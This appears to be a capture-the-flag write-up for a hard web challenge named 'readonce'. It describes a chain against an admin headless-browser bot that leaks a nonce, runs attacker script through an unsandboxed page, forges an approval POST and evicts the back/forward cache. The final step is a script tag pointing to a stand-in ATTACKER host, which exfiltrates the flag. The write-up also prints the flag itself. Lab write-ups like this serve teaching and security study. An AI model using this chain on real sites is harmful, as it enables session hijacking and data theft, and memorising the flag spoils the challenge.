# readonce — web / Hard

Flag: `pwnsec{ae485ec67133b208}`

## Goal

`GET /api/flag` needs `req.session.admin && currentReview`. Only the puppeteer bot is
admin (`/reports/session` with the secret `X-Bot-Token`), so the flag must be read from
inside the bot's session.

The one unescaped sink is `review-document.ejs` (`<%- note.html %>`, note ≤128 chars),
rendered only by the **second** `GET /reports/check`, which demands both:

* `policy(req)` — `sec-fetch-site: none` **and** `sec-fetch-dest: document`
* `consumeReport(req)` — `rid`, `state == nonce`, `prepared`, **`approved`**, `!used`

That page is served with no CSP at all (`helmet({contentSecurityPolicy:false})`).

## The bind

The bot makes exactly one attacker-controlled navigation, *after* it arms `prepared`:

```
page.goto /reports/check?rid&state   -> visited = true          (entry 1)
page.goto /api/flag                                             (entry 2)
fetch POST /reports/arm/<id>         -> prepared = true
page.goto <report.url>&rid=<id>      -> ours                    (entry 3)
sleep 10s
```

Only `page.goto` yields `sec-fetch-site: none`. So we need two "none" loads after arming
but are given one. `approved` needs a POST from the bot's own session, which needs
script on the app origin.

## Four source facts that break it

1. **`GET /review` is unauthenticated** — `reviewMatches()` checks only `rid`, which the
   bot hands us by appending `&rid=` to our URL. It renders
   `const report = {id, state}` with `state = currentReview.nonce`, and as a side effect
   sets `currentReview.document.url` to our `u=` parameter. One request both leaks the
   nonce and arms the script URL.
2. **`/sandbox` opened top-level is not sandboxed.** The `sandbox="allow-scripts"` opaque
   origin only exists when `/review` frames it. Opened directly it is an ordinary
   app-origin page that runs `<script nonce src="<our url>">` — attacker JS on the app
   origin with the bot's admin session. `window.open` is *not* popup-blocked in this bot.
3. **CSP3 `form-action` has no `default-src` fallback.** `/sandbox` sets
   `default-src 'none'` (no fetch, no frames, no script injection under
   `trusted-types 'none'`) but a same-site form POST to `/complete` still works →
   `approved = true`. No postMessage race needed.
4. **A history traversal is browser-initiated**, so `history.go()` back to the bot's own
   entry 1 carries `sec-fetch-site: none` + `sec-fetch-dest: document`, with `visited`
   already true → `review-document` renders our note.

## Two things that actually decide it

* **bfcache.** The traversal restores entry 1 from the back/forward cache and never hits
  the server. `Vary: Cookie` + the `view` cookie defeat only the HTTP cache. Walking a
  chain of ~8 fresh attacker documents pushes the entry out of Chrome's bfcache slots, and
  the traversal becomes a real request. Each pad must navigate **after** its `load` event,
  or Chrome treats it as a replacement and no entry (or slot) is created. Prefetching the
  pads with `fetch(..., {cache:'force-cache'})` makes the whole chain cost no round trips.
* **Which origin the bot's cookie is on.** The Dockerfile hardcodes
  `APP_URL=http://localhost:3000`, so inside the container the admin session is bound to
  `localhost:3000`, *not* the public HTTPS hostname. Opening `/sandbox` on the public host
  renders fine (it only checks `rid`) but carries no session, so `/complete` silently
  fails and the traversal 403s. Opening the popup on the bot's own origin fixes it; the
  exploit just opens all candidates.

## Chain

1. `POST /create` with `<script src="https://ATTACKER/p.js"></script>` (74 chars).
2. `POST /report` with `url=https://ATTACKER/go?note=<noteId>`.
3. `/go` sees `rid`; server-side `GET /review?rid&u=https://ATTACKER/pm.js` → nonce.
4. Page opens `<bot-origin>/sandbox?rid=` → `pm.js` form-POSTs `/complete` → `approved`.
5. Same page walks 8 prefetched pads, then `history.go(-(history.length-2))` → entry 1.
6. `review-document` renders → `p.js` reads `/api/flag` same-origin and exfils.

## Lesson

The blocker recorded as "no attacker hosting" was real but secondary; the chain still
failed with hosting because the bot's session lives on the container-internal `APP_URL`,
not the public hostname. When an admin bot is reached through a public proxy, the origin
the *browser* uses and the origin *you* use are not the same, and any step that needs the
bot's cookie must target the former.
